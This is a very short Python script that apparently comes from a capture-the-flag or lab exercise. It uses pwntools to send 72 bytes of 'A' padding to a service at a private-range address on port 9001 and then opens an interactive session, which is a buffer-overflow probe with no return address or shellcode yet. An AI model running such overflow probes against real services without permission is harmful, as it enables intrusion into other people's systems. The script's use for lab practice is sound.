from pwn import *

payload = b"A" * 72

try:
    # Attempt to connect to the remote host
    target = remote('10.10.7.65', 9001)
    target.sendline(payload)
    target.interactive()
except PwnlibException as e:
    print(f"Connection failed: {e}")
